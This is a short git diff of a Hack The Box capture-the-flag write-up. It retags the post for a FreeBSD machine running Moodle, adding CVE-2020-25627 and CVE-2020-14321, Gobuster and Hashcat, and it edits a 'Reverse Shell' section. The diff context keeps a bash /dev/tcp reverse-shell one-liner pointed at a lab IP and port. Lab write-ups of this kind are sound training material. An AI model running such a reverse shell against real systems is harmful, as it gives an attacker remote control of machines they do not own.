@@ -10,10 +10,12 @@ categories:
 tags:
   - HTB
   - CTF
-  - Linux
-  - 8.1.0-dev
-  - Chef
-  - Knife
+  - FreeBSD
+  - Gobuster
+  - Moodle
+  - CVE-2020-25627
+  - CVE-2020-14321
+  - Hashcat
 ---
 
 ## Machine Information
@@ -336,8 +338,6 @@ uid=80(www) gid=80(www) groups=80(www)
 ## Reverse Shell
 
 Nice, we have remote command execution. Let's start a reverse shell:
-
-We can use a simple pentestmonkey one:
 
 ```text
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.227/4444 0>&1'
